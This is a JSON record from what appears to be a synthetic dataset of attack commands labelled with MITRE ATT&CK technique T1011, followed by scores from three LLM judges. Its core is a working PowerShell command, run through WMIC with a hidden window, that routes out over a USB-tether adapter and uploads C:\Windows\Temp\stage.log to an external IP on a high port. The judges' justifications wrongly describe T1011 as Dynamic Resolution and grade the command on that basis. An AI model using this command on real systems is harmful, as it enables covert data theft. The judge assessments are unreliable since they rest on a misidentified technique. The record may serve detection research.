{
  "technique_id": "T1011",
  "platform": "Windows",
  "shell": "Powershell",
  "command": "wmic process call create \"powershell -NoProfile -WindowStyle Hidden -Command `$ifc=Get-WmiObject Win32_NetworkAdapterConfiguration | ?{ `$_.IPEnabled -and (`$_.Description -like '*Remote NDIS*') }; if(`$ifc){ `$ip=@(`$ifc.IPAddress | ?{ `$_ -match '^[0-9]{1,3}(\\.[0-9]{1,3}){3}$' })[0]; if(`$ip){ `$c=New-Object Net.Sockets.TcpClient; `$c.Client.Bind((New-Object Net.IPEndPoint ([Net.IPAddress]::Parse(`$ip),0))); `$c.Connect('198.51.100.199',50888); `$s=`$c.GetStream(); `$b=[IO.File]::ReadAllBytes('C:\\Windows\\Temp\\stage.log'); `$s.Write(`$b,0,`$b.Length); `$s.Close(); `$c.Close() } }\"",
  "explanation": "Uses WMIC to invoke PowerShell that binds to a USB tethering (Remote NDIS) adapter and exfiltrates a file to an external host using a high TCP port. This exploits a USB-backed network path distinct from the primary NIC.",
  "rationale_steps": [
    "Detect a USB tethering NIC via its Remote NDIS description.",
    "Bind the TCP client to that interface to force egress over USB tether.",
    "Connect to an uncommon port on the exfiltration server.",
    "Send the selected file over the alternate network medium per T1011.",
    "Refrain from system-level network configuration changes."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1011-987933e0-e65af2df",
  "source_prompt_hash": "987933e0",
  "timestamp_utc": "2025-09-30T08:13:32.291694Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, backticks, parentheses, and braces, correct PowerShell syntax with appropriate variable declarations, and proper escape sequences for nested command execution.",
        "semantic_score": 3,
        "semantic_justification": "While the command does exfiltrate data over a network connection, it doesn't implement the Dynamic Resolution technique (T1011) as described - it uses a hardcoded IP address (198.51.100.199) rather than algorithmically determining endpoints through DGAs or similar methods.",
        "combined_score": 4.0,
        "confidence": 0.9,
        "timestamp": "2025-10-02T05:49:13.952960Z"
      },
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Command is well-formed with balanced quoting, valid PowerShell syntax, proper separators, and parseable WMIC invocation.",
        "semantic_score": 1,
        "semantic_justification": "It exfiltrates to a fixed IP/port via a specific adapter and does not perform any dynamic endpoint resolution (no DGA/fast-flux/dynamic DNS), so it is not aligned with T1011 Dynamic Resolution.",
        "combined_score": 3.0,
        "confidence": 1,
        "timestamp": "2025-10-02T05:50:03.730590Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, using correct WMIC syntax, valid PowerShell flags, balanced quotes/parentheses/braces, and proper backtick escaping for PowerShell variables within the nested command string.",
        "semantic_score": 1,
        "semantic_justification": "The command dynamically selects a *local* network interface (Remote NDIS adapter) for outbound communication, but the *remote* command and control endpoint ('198.51.100.199') is hardcoded, which does not align with T1011's focus on dynamic determination or generation of the *remote* C2 endpoint.",
        "combined_score": 3.0,
        "confidence": 0.9,
        "timestamp": "2025-10-02T06:00:00.836689Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 1.667,
    "llm_average_score": 3.333,
    "llm_verdict": "likely_mismatch",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}